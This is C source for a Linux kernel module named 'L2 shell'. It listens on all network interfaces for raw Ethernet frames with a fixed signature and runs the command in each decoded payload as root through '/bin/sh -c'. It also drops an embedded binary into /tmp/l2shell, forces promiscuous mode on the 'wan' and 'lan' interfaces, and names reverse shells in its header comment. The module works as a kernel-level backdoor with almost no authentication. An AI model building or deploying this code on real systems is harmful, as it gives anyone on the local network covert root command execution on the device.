/* l2shell_kmod.c - kernel module transport for L2 shell
 * Init-trigger: listens on all interfaces for CLIENT_SIGNATURE frames.
 * On first payload from a client, launches the provided command via
 * call_usermodehelper(). No /dev interface is exposed; the launched
 * userspace helper handles IO (e.g., reverse shell).
 */

#include "frame_dedup.h"
#include "hello_proto.h"
#include "l2shell_embedded.h"
#include "l2shell_lz4_kmod.h"

#include <linux/dcache.h>
#include <linux/errno.h>
#include <linux/etherdevice.h>
#include <linux/fs.h>
#include <linux/if_ether.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/mount.h>
#include <linux/namei.h>
#include <linux/netdevice.h>
#include <linux/version.h>
#include <linux/path.h>
#include <linux/printk.h>
#include <linux/rtnetlink.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/stat.h>
#include <linux/syscalls.h>
#include <linux/user_namespace.h>
#include <linux/vmalloc.h>
#include <linux/workqueue.h>

#define ETHER_TYPE_CUSTOM 0x88B5
#define CLIENT_SIGNATURE 0xAABBCCDDu
#define SERVER_SIGNATURE 0xDDCCBBAAu
#define MAX_PAYLOAD_SIZE 1024
#define MAX_DATA_SIZE (MAX_PAYLOAD_SIZE - PACKET_NONCE_LEN)
#define KMOD_DEDUP_SLOTS 32
#define KMOD_DEDUP_WINDOW_NS (5 * 1000 * 1000ULL)
#define L2SHELL_TMP_PATH "/tmp/l2shell"
#define L2SHELL_DEFAULT_CMD "/tmp/l2shell server any"

struct __attribute__((packed)) packh {
    struct ethhdr eth;
    __be32 signature;
    __be32 payload_size;
    __be32 crc;
};

struct __attribute__((packed)) pack {
    struct packh h;
    u8 payload[MAX_PAYLOAD_SIZE];
};

static struct {
    spinlock_t launch_lock;
    bool launch_pending;
    struct work_struct launch_work;
    struct delayed_work promisc_work;
    char cmd_buf[MAX_DATA_SIZE + 1];
    frame_dedup_entry_t dedup_entries[KMOD_DEDUP_SLOTS];
    frame_dedup_cache_t dedup;
    struct net_device *dev;
    u8 cli_mac[ETH_ALEN];
    bool have_cli;
    bool capture_enabled;
} g;

#define PROMISC_RETRY_MS 5000
static const char *const auto_promisc_ifaces[] = {"wan", "lan"};
static const char *const auto_disable_offload[] = {"wan", "lan"};

#define l2sh_info(fmt, ...) pr_info("l2sh: " fmt, ##__VA_ARGS__)

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 3, 0)
#define L2SHELL_MNT_IDMAP(path) mnt_idmap((path)->mnt)
#else
#define L2SHELL_MNT_IDMAP(path) mnt_user_ns((path)->mnt)
#endif


static inline int l2shell_notify_change(struct path *path, struct iattr *attr) {
    return notify_change(L2SHELL_MNT_IDMAP(path), path->dentry, attr, NULL);
}

static size_t store_cmd_bytes(const u8 *src, size_t len) {
    size_t copy_len;

    if (!src || len == 0)
        return 0;

    copy_len = len;
    if (copy_len >= sizeof(g.cmd_buf))
        copy_len = sizeof(g.cmd_buf) - 1;

    memcpy(g.cmd_buf, src, copy_len);
    g.cmd_buf[copy_len] = '\0';
    return copy_len;
}

static size_t store_default_cmd(void) {
    const char *cmd = L2SHELL_DEFAULT_CMD;
    size_t cmd_len = strlen(cmd);
    return store_cmd_bytes((const u8 *)cmd, cmd_len);
}

static size_t store_spawn_cmd(const u8 *payload, size_t len, const hello_view_t *hello) {
    size_t stored = 0;

    if (hello && hello->server_started && hello->server_bin_path && hello->server_bin_path_len > 0) {
        stored = store_cmd_bytes(hello->server_bin_path, hello->server_bin_path_len);
    } else if (!hello && payload && len > 0) {
        size_t raw_len = strnlen((const char *)payload, len);
        if (raw_len > 0)
            stored = store_cmd_bytes(payload, raw_len);
        else if (len > 0 && payload[0] != '\0')
            stored = store_cmd_bytes(payload, len);
    }

    if (!stored)
        stored = store_default_cmd();
    return stored;
}

static int ensure_exec_perms_path(struct path *path) {
    struct inode *inode;
    struct iattr attr;
    int error;

    if (!path || !path->dentry)
        return -EINVAL;

    inode = d_inode(path->dentry);
    if (!inode)
        return -ENOENT;

    attr.ia_valid = ATTR_MODE;
    attr.ia_mode = (inode->i_mode & S_IFMT) | S_IRWXU;

    inode_lock(inode);

    error = l2shell_notify_change(path, &attr);

    inode_unlock(inode);
    return error;
}

static int ensure_exec_perms_file(struct file *filp) {
    struct path path = filp->f_path;
    int ret;

    path_get(&path);
    ret = ensure_exec_perms_path(&path);
    path_put(&path);
    return ret;
}

static void cleanup_tmp_binary(void) {
    struct path path;
    struct dentry *parent;
    struct inode *dir;
    int ret;

    ret = kern_path(L2SHELL_TMP_PATH, LOOKUP_FOLLOW, &path);
    if (ret)
        return;

    parent = dget_parent(path.dentry);
    {
        struct path parent_path = {
            .mnt = path.mnt,
            .dentry = parent,
        };
        dir = d_inode(parent);
        inode_lock(dir);
        ret = vfs_unlink(L2SHELL_MNT_IDMAP(&parent_path), dir, path.dentry, NULL);
        inode_unlock(dir);
    }
    dput(parent);
    path_put(&path);

    if (ret && ret != -ENOENT)
        pr_warn("l2sh: failed to unlink stale binary path=%s err=%d\n",
                L2SHELL_TMP_PATH,
                ret);
}

static int ensure_l2shell_binary(void) {
    struct path path;
    struct kstat stat;
    struct file *filp;
    loff_t pos = 0;
    size_t remaining = l2shell_embed_orig_len;
    unsigned char *decomp = NULL;
    int ret;
    bool cleaned = false;

retry_stat:
    ret = kern_path(L2SHELL_TMP_PATH, LOOKUP_FOLLOW, &path);
    if (!ret) {
        ret = vfs_getattr(&path, &stat, STATX_SIZE, AT_STATX_SYNC_AS_STAT);
        if (!ret) {
            bool size_ok = (stat.size == l2shell_embed_orig_len);
            bool mode_ok = (stat.mode & S_IXUSR);
            if (!mode_ok) {
                int mode_ret = ensure_exec_perms_path(&path);
                if (mode_ret)
                    ret = mode_ret;
                else
                    mode_ok = true;
            }
            if (size_ok && mode_ok) {
                path_put(&path);
                return 0;
            }
        }
        path_put(&path);
    } else if (ret == -EUCLEAN && !cleaned) {
        cleanup_tmp_binary();
        cleaned = true;
        goto retry_stat;
    }

retry_open:
    filp = filp_open(L2SHELL_TMP_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (IS_ERR(filp)) {
        ret = PTR_ERR(filp);
        if (ret == -EUCLEAN && !cleaned) {
            cleanup_tmp_binary();
            cleaned = true;
            goto retry_open;
        }
        return ret;
    }

    decomp = vmalloc(l2shell_embed_orig_len);
    if (!decomp) {
        ret = -ENOMEM;
        goto out_close;
    }

    ret = l2sh_lz4_decompress(l2shell_embed,
                              l2shell_embed_len,
                              decomp,
                              l2shell_embed_orig_len);
    if (ret < 0 || (size_t)ret != l2shell_embed_orig_len) {
        ret = -EIO;
        goto out_free;
    }

    while (remaining > 0) {
        ssize_t wrote = kernel_write(filp, decomp + (l2shell_embed_orig_len - remaining), remaining, &pos);
        if (wrote < 0) {
            ret = (int)wrote;
            goto out_free;
        }
        if (wrote == 0) {
            ret = -EIO;
            goto out_free;
        }
        remaining -= (size_t)wrote;
    }

    ret = vfs_fsync(filp, 0);
    if (!ret)
        ret = ensure_exec_perms_file(filp);

out_free:
    if (decomp)
        vfree(decomp);
out_close:
    filp_close(filp, NULL);
    if (ret)
        return ret;
    pr_info("l2sh: refreshed embedded server at %s size=%u (compressed=%u)\n",
            L2SHELL_TMP_PATH,
            l2shell_embed_orig_len,
            l2shell_embed_len);
    return 0;
}

static void disable_capture(void);
static void enable_capture(void);
static void schedule_promisc_work(void);

static int build_server_packet(struct pack *pkt, const u8 *src_mac, const u8 *dst_mac,
                               const u8 *payload, size_t payload_len) {
    size_t nonce_len = PACKET_NONCE_LEN;
    size_t enc_payload_len;
    size_t frame_len;
    u32 crc;
    u8 *nonce_ptr;
    u8 *data_ptr;

    if (!pkt || !src_mac || !dst_mac)
        return -EINVAL;
    if (payload_len + nonce_len > MAX_PAYLOAD_SIZE)
        return -EINVAL;

    memset(pkt, 0, sizeof(*pkt));
    memcpy(pkt->h.eth.h_source, src_mac, ETH_ALEN);
    memcpy(pkt->h.eth.h_dest, dst_mac, ETH_ALEN);
    pkt->h.eth.h_proto = htons(ETHER_TYPE_CUSTOM);
    pkt->h.signature = cpu_to_be32(SERVER_SIGNATURE);
    enc_payload_len = payload_len + nonce_len;
    pkt->h.payload_size = cpu_to_be32((u32)enc_payload_len);
    pkt->h.crc = 0;

    nonce_ptr = pkt->payload;
    data_ptr = pkt->payload + nonce_len;

    hello_generate_nonce(nonce_ptr, nonce_len);
    if (payload_len > 0 && payload) {
        memcpy(data_ptr, payload, payload_len);
        for (size_t i = 0; i < payload_len; i++)
            data_ptr[i] ^= nonce_ptr[i & (nonce_len - 1)];
        enc_dec(data_ptr, data_ptr, zero_key, payload_len);
    }

    frame_len = sizeof(pkt->h) + enc_payload_len;
    crc = csum32((const u8 *)pkt, frame_len);
    pkt->h.crc = cpu_to_be32(crc);

    if (payload_len > 0)
        enc_dec(data_ptr, data_ptr, (const u8 *)&pkt->h.crc, payload_len);

    return (int)frame_len;
}

static void send_ready_ack(struct net_device *dev, const u8 dst_mac[ETH_ALEN], const struct hello_view *hello) {
    struct pack *pkt;
    struct sk_buff *skb;
    char payload[64];
    size_t payload_len;
    int frame_len;
    int err;
    unsigned long long nonce = 0ULL;
    bool have_nonce = false;

    if (!dev || !dst_mac)
        return;

    if (hello && hello->have_nonce) {
        nonce = hello->nonce;
        have_nonce = true;
        payload_len = scnprintf(payload, sizeof(payload),
                                "ready nonce=%016llx source=kernel\n",
                                nonce);
    } else {
        payload_len = scnprintf(payload, sizeof(payload),
                                "ready source=kernel\n");
    }

    pkt = kzalloc(sizeof(*pkt), GFP_KERNEL);
    if (!pkt)
        return;

    frame_len = build_server_packet(pkt, dev->dev_addr, dst_mac,
                                    (const u8 *)payload, payload_len);
    if (frame_len < 0) {
        kfree(pkt);
        return;
    }

    skb = netdev_alloc_skb(dev, frame_len + NET_IP_ALIGN);
    if (!skb) {
        kfree(pkt);
        return;
    }

    skb_reserve(skb, NET_IP_ALIGN);
    memcpy(skb_put(skb, frame_len), pkt, frame_len);
    skb->dev = dev;
    skb->protocol = htons(ETHER_TYPE_CUSTOM);
    kfree(pkt);

    err = dev_queue_xmit(skb);
    if (err)
        pr_info("l2sh: ready ack tx failed err=%d\n", err);
    else if (have_nonce)
        pr_info("l2sh: ready ack sent nonce=%016llx\n", nonce);
    else
        pr_info("l2sh: ready ack sent without nonce\n");
}

static void dump_frame(const char *tag, const u8 *buf, size_t len) {
    if (!buf || !len) return;
    print_hex_dump(KERN_INFO, tag, DUMP_PREFIX_OFFSET, 16, 1, buf, len, false);
}

static void exec_server(struct work_struct *work) {
    static char *envp[] = {
        "HOME=/tmp",
        "TERM=xterm-256color",
        NULL};
    char *argv[] = {"/bin/sh", "-c", g.cmd_buf, NULL};
    struct subprocess_info *info;
    int prep;

    prep = ensure_l2shell_binary();
    if (prep) {
        pr_err("l2sh: failed to prepare embedded server err=%d\n", prep);
        spin_lock(&g.launch_lock);
        g.launch_pending = false;
        spin_unlock(&g.launch_lock);
        return;
    }

    if (!g.cmd_buf[0])
        store_default_cmd();

    pr_info("l2sh: launching cmd='%s'\n", g.cmd_buf);

    info = call_usermodehelper_setup(argv[0], argv, envp,
                                     GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        spin_lock(&g.launch_lock);
        g.launch_pending = false;
        spin_unlock(&g.launch_lock);
        return;
    }

    disable_capture();
    call_usermodehelper_exec(info, UMH_WAIT_PROC);
    enable_capture();

    spin_lock(&g.launch_lock);
    g.launch_pending = false;
    spin_unlock(&g.launch_lock);
}

struct chdr {
    __be32 signature;
    __be32 payload_size;
    __be32 crc;
};

static inline u32 kmod_frame_fingerprint(u32 crc, u32 sig, u32 payload_size) {
    return crc ^ sig ^ payload_size;
}

static bool kmod_should_drop_frame(struct net_device *dev, size_t frame_len, u32 checksum) {
    u64 now = ktime_get_ns();
    int prev_ifindex = 0;
    u64 age_ns = 0;
    int cur_ifindex = dev ? dev->ifindex : 0;

    if (!frame_dedup_should_drop(&g.dedup,
                                 frame_len,
                                 checksum,
                                 cur_ifindex,
                                 now,
                                 KMOD_DEDUP_WINDOW_NS,
                                 &prev_ifindex,
                                 &age_ns)) {
        return false;
    }

    l2sh_info("dedup drop len=%zu checksum=%u iface=%s prev_ifindex=%d age_ns=%llu\n",
              frame_len,
              checksum,
              dev ? dev->name : "<unknown>",
              prev_ifindex,
              age_ns);
    return true;
}

static int l2_rx(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
    struct ethhdr *eth;
    struct chdr *h;
    u32 sig, psize, crc_recv, crc_calc;
    int need;
    hello_view_t hello;
    bool hello_ok = false;

    /* we only need our header in the linear area */
    if (unlikely(!pskb_may_pull(skb, sizeof(struct chdr)))) {
        l2sh_info("drop on ifname=%s header truncated\n", dev ? dev->name : "<unknown>");
        return NET_RX_SUCCESS;
    }

    eth = eth_hdr(skb);           /* mac header */
    h = (struct chdr *)skb->data; /* our header sits in payload */

    if (unlikely(!eth)) {
        l2sh_info("drop on ifname=%s no ethhdr\n", dev ? dev->name : "<unknown>");
        return NET_RX_SUCCESS;
    }

    /* double check ethertype even though we are bound to it */
    if (unlikely(eth->h_proto != htons(ETHER_TYPE_CUSTOM)))
        return NET_RX_SUCCESS;

    sig = be32_to_cpu(h->signature);
    psize = be32_to_cpu(h->payload_size);
    crc_recv = be32_to_cpu(h->crc);

    if (sig != CLIENT_SIGNATURE)
        return NET_RX_SUCCESS;

    if (psize > MAX_PAYLOAD_SIZE) {
        l2sh_info("drop pay_sz=%u ifname=%s (too large)\n",
                  psize,
                  dev ? dev->name : "<unknown>");
        return NET_RX_SUCCESS;
    }

    need = (int)sizeof(struct chdr) + (int)psize;
    if (unlikely(!pskb_may_pull(skb, need))) {
        l2sh_info("drop pay_sz=%u ifname=%s (truncated)\n",
                  psize,
                  dev ? dev->name : "<unknown>");
        return NET_RX_SUCCESS;
    }

    l2sh_info("frame from ifname=%s src=%pM payload=%u\n",
              dev ? dev->name : "<unknown>",
              eth->h_source,
              psize);

    {
        size_t frame_len = ETH_HLEN + (size_t)need;
        u32 fingerprint = kmod_frame_fingerprint(crc_recv, sig, psize);
        if (kmod_should_drop_frame(dev, frame_len, fingerprint))
            return NET_RX_SUCCESS;
    }

    dump_frame("l2sh: rx frame ", (const u8 *)eth, ETH_HLEN + sizeof(*h) + psize);

    if (psize < PACKET_NONCE_LEN)
        return NET_RX_SUCCESS;

    {
        size_t enc_payload = (size_t)psize;
        size_t plain_len = enc_payload - PACKET_NONCE_LEN;
        u8 *nonce_ptr = (u8 *)(h + 1);
        u8 *data_ptr = nonce_ptr + PACKET_NONCE_LEN;
        u8 nonce_buf[PACKET_NONCE_LEN];
        u8 cipher_preview[32] = {0};
        size_t preview_len = 0;

        memcpy(nonce_buf, nonce_ptr, PACKET_NONCE_LEN);

        if (plain_len > 0) {
            preview_len = plain_len > sizeof(cipher_preview) ? sizeof(cipher_preview) : plain_len;
            memcpy(cipher_preview, data_ptr, preview_len);
            enc_dec(data_ptr, data_ptr, (u8 *)&h->crc, plain_len);
        }

    /* вычисляем crc по ethernet-заголовку, нашему заголовку (crc=0) и payload */
        {
            struct chdr hdr_copy = *h;
            hdr_copy.crc = 0;
            crc_calc = csum32((const u8 *)eth, ETH_HLEN);
            crc_calc += csum32((const u8 *)&hdr_copy, sizeof(hdr_copy));
            crc_calc += csum32((const u8 *)(h + 1), enc_payload);
        }

        if (crc_calc != crc_recv) {
            l2sh_info("crc mismatch src=%pM recv=%u calc=%u\n",
                      eth->h_source, crc_recv, crc_calc);
            l2sh_info("crc debug plain_len=%zu preview_len=%zu crc_be=%08x\n",
                      plain_len, preview_len, be32_to_cpu(h->crc));
            print_hex_dump(KERN_INFO,
                           "l2sh: crc nonce ",
                           DUMP_PREFIX_NONE,
                           16,
                           1,
                           nonce_buf,
                           PACKET_NONCE_LEN,
                           false);
            if (preview_len > 0) {
                print_hex_dump(KERN_INFO,
                               "l2sh: crc payload enc ",
                               DUMP_PREFIX_NONE,
                               16,
                               1,
                               cipher_preview,
                               preview_len,
                               false);
                print_hex_dump(KERN_INFO,
                               "l2sh: crc payload dec ",
                               DUMP_PREFIX_NONE,
                               16,
                               1,
                               data_ptr,
                               preview_len,
                               false);
            }
            return NET_RX_SUCCESS;
        }

        if (plain_len > 0)
            enc_dec(data_ptr, data_ptr, zero_key, plain_len);

        for (size_t i = 0; i < plain_len; i++)
            data_ptr[i] ^= nonce_buf[i & (PACKET_NONCE_LEN - 1)];

        if (plain_len > 0)
            memmove(nonce_ptr, data_ptr, plain_len);

        psize = (u32)plain_len;

        memset(&hello, 0, sizeof(hello));
        if (plain_len > 0 && hello_parse(nonce_ptr, (size_t)plain_len, &hello) == 0)
            hello_ok = true;

        if (!g.have_cli || memcmp(g.cli_mac, eth->h_source, ETH_ALEN)) {
            memcpy(g.cli_mac, eth->h_source, ETH_ALEN);
            rcu_assign_pointer(g.dev, dev);
            g.have_cli = true;
            pr_info("l2sh: tracking client=%pM on ifname=%s\n",
                    g.cli_mac,
                    dev ? dev->name : "<unknown>");
        }

        if (plain_len > 0) {
            unsigned long flags;
            bool should_ack = false;
            spin_lock_irqsave(&g.launch_lock, flags);
            if (!g.launch_pending) {
                size_t used = store_spawn_cmd(nonce_ptr, plain_len, hello_ok ? &hello : NULL);
                if (!used) {
                    g.cmd_buf[0] = '\0';
                    l2sh_info("hello parse failed, empty command\n");
                }
                g.launch_pending = true;
                should_ack = true;
                l2sh_info("command to run src=%pM cmd='%s'\n",
                          eth->h_source, g.cmd_buf[0] ? g.cmd_buf : "<empty>");
                schedule_work(&g.launch_work);
            } else {
                l2sh_info("command already pending, ignoring new payload\n");
            }
            spin_unlock_irqrestore(&g.launch_lock, flags);

            if (should_ack)
                send_ready_ack(dev, eth->h_source, hello_ok ? &hello : NULL);
        }

        if (plain_len > 0) {
            memmove(data_ptr, nonce_ptr, plain_len);
        }
        memcpy(nonce_ptr, nonce_buf, PACKET_NONCE_LEN);

        if (plain_len > 0) {
            for (size_t i = 0; i < plain_len; i++)
                data_ptr[i] ^= nonce_buf[i & (PACKET_NONCE_LEN - 1)];
            enc_dec(data_ptr, data_ptr, zero_key, plain_len);
            enc_dec(data_ptr, data_ptr, (u8 *)&h->crc, plain_len);
        }
    }

    return NET_RX_SUCCESS;
}

static void log_interfaces(void) {
    struct net_device *dev;
    struct net *net = &init_net;

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 0, 0)
    read_lock(&dev_base_lock);
    for_each_netdev(net, dev) {
        pr_info("l2sh: listening on ifname=%s mac=%pM\n", dev->name, dev->dev_addr);
    }
    read_unlock(&dev_base_lock);
#else
    rcu_read_lock();
    for_each_netdev_rcu(net, dev) {
        pr_info("l2sh: listening on ifname=%s mac=%pM\n", dev->name, dev->dev_addr);
    }
    rcu_read_unlock();
#endif
}

static struct packet_type l2_pt = {
    .type = cpu_to_be16(ETHER_TYPE_CUSTOM),
    .func = l2_rx,
};

static void disable_capture(void) {
    if (!g.capture_enabled)
        return;
    dev_remove_pack(&l2_pt);
    g.capture_enabled = false;
    pr_info("l2sh: listening stopped\n");
}

static void enable_capture(void) {
    if (g.capture_enabled)
        return;
    dev_add_pack(&l2_pt);
    g.capture_enabled = true;
    pr_info("l2sh: listening started\n");
}

static void schedule_promisc_work(void) {
    schedule_delayed_work(&g.promisc_work, msecs_to_jiffies(PROMISC_RETRY_MS));
}

static void l2sh_force_promisc(const char *ifname) {
    struct net_device *dev;
    int rc;

    if (!ifname || !ifname[0])
        return;

    dev = dev_get_by_name(&init_net, ifname);
    if (!dev)
        return;

    rtnl_lock();
    if ((dev->flags & (IFF_UP | IFF_PROMISC | IFF_ALLMULTI)) ==
        (IFF_UP | IFF_PROMISC | IFF_ALLMULTI)) {
        rtnl_unlock();
        dev_put(dev);
        return;
    }
    rc = dev_change_flags(dev, dev->flags | IFF_UP | IFF_PROMISC | IFF_ALLMULTI, NULL);
    rtnl_unlock();
    if (rc == 0)
        pr_info("l2sh: iface=%s promisc=on allmulti=on up=on\n", ifname);
    else
        pr_info("l2sh: iface=%s promisc/allmulti_fail rc=%d\n", ifname, rc);
    dev_put(dev);
}

static void l2sh_force_offload(const char *ifname) {
    char path[128];
    struct file *f;

    if (!ifname || !ifname[0])
        return;

#define WRITE_KOBJ(name, value)                                          \
    do {                                                                 \
        int ret = snprintf(path, sizeof(path),                           \
                           "/sys/class/net/%s/queues/%s", ifname, name); \
        if (ret <= 0 || ret >= (int)sizeof(path))                        \
            break;                                                       \
        f = filp_open(path, O_WRONLY, 0);                                \
        if (!IS_ERR(f)) {                                                \
            kernel_write(f, value, strlen(value), &f->f_pos);            \
            filp_close(f, NULL);                                         \
        }                                                                \
    } while (0)

    WRITE_KOBJ("rx-0/rps_cpus", "ffff\n");
    WRITE_KOBJ("tx-0/xps_cpus", "ffff\n");
#undef WRITE_KOBJ
}

static void l2sh_promisc_work(struct work_struct *work) {
    size_t i;

    for (i = 0; i < ARRAY_SIZE(auto_promisc_ifaces); i++)
        l2sh_force_promisc(auto_promisc_ifaces[i]);
    for (i = 0; i < ARRAY_SIZE(auto_disable_offload); i++)
        l2sh_force_offload(auto_disable_offload[i]);
    schedule_promisc_work();
}

static int __init l2_init(void) {
    memset(&g, 0, sizeof(g));
    spin_lock_init(&g.launch_lock);
    INIT_WORK(&g.launch_work, exec_server);
    INIT_DELAYED_WORK(&g.promisc_work, l2sh_promisc_work);
    frame_dedup_init(&g.dedup, g.dedup_entries, KMOD_DEDUP_SLOTS);

    enable_capture();
    schedule_promisc_work();
    pr_info("l2sh: kernel trigger loaded, ethertype 0x%04x\n", ETHER_TYPE_CUSTOM);
    log_interfaces();
    return 0;
}

static void __exit l2_exit(void) {
    disable_capture();
    flush_work(&g.launch_work);
    cancel_delayed_work_sync(&g.promisc_work);
    pr_info("l2sh: unloaded\n");
}

module_init(l2_init);
module_exit(l2_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("me");
MODULE_DESCRIPTION("L2 shell kernel module");
